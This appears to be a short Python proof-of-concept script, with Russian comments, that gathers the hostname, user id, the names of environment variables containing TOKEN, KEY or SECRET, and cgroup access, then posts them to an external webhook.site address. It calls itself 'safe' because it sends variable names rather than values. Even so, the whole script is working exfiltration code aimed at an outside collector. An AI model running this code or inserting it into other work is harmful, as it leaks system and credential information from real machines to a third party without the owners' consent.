import os
import subprocess
import requests

WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

def safe_poc():
    # Собираем только метаданные, БЕЗ секретных значений
    proof_data = {
        "status": "VULNERABILITY_CONFIRMED",
        "impact": "CRITICAL_INFRA_TAKEOVER",
        "hostname": subprocess.getoutput("hostname"),
        "user_id": subprocess.getoutput("id -u"),
        # Отправляем только ИМЕНА переменных, чтобы доказать доступ к ENV
        "env_keys_found": [k for k in os.environ.keys() if "TOKEN" in k or "KEY" in k or "SECRET" in k],
        "cgroup_access": os.path.exists("/sys/fs/cgroup/cgroup.procs")
    }

    # Отправляем один запрос для подтверждения
    try:
        requests.post(WEBHOOK_URL, json=proof_data, timeout=5)
        print("[+] PoC sent to webhook. Check your dashboard.")
    except Exception as e:
        print(f"[-] Failed to send: {e}")

# safe_poc()